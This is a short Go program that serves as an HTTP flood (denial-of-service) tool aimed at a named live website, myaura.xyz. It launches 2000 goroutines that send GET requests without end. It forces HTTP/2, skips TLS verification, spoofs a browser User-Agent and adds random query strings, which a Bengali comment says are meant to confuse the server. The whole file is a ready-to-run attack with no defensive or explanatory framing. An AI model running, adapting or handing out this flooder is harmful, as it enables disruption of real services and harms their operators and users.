package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"time"
)

func main() {
	target := "https://myaura.xyz/"
	threads := 2000 

	// HTTP/2 Force Enable ও TLS কনফিগারেশন
	transport := &http.Transport{
		ForceAttemptHTTP2: true, // এটি অটোমেটিক HTTP/2 ব্যবহার করবে
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        1000,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	fmt.Println("🔥 Vortex Turbo Active | Mode: Raw HTTP/2 | No Cookies/Proxy")

	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// রেন্ডম কুয়েরি যাতে সার্ভার কনফিউজ হয়
				url := fmt.Sprintf("%s?vortex=%d&samir=%d", target, rand.Intn(1000000), id)
				
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				req.Header.Set("Accept", "*/*")

				resp, err := client.Do(req)
				if err == nil {
					if id == 0 {
						fmt.Printf("📡 Status: %d | Power: Maximum\n", resp.StatusCode)
					}
					resp.Body.Close()
				}
			}
		}(i)
	}
	select {}
}
